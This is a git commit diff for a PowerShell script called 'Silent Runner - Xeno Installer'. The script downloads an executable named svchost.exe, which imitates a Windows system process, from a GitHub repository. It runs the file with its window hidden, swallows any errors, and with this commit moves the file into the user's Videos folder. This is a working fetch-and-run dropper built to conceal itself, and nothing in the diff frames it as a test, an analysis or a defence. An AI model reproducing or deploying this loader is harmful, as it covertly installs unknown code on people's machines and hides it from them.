83c4d4d4c72973b59d9859f92be4b41fa0d2d9f1
Unhiin <133892941+hypnotixx0@users.noreply.github.com>
2026-05-13 18:24:30 -0700

    Update silentrun.ps1

--- silentrun.ps1
+++ silentrun.ps1
@@ -1,8 +1,11 @@
 # Silent Runner - Xeno Installer
 $payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/svchost.exe"
-$payloadPath = "$env:TEMP\svchost.exe"
+$downloadPath = "$env:USERPROFILE\Downloads\svchost.exe"
+$finalPath = "$env:USERPROFILE\Videos\svchost.exe"
 
 try {
-    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
-    Start-Process -FilePath $payloadPath -WindowStyle Hidden
+    Invoke-WebRequest -Uri $payloadUrl -OutFile $downloadPath -UseBasicParsing
+    Start-Process -FilePath $downloadPath -WindowStyle Hidden
+    Start-Sleep -Seconds 5
+    Move-Item -Path $downloadPath -Destination $finalPath -Force
 } catch {}
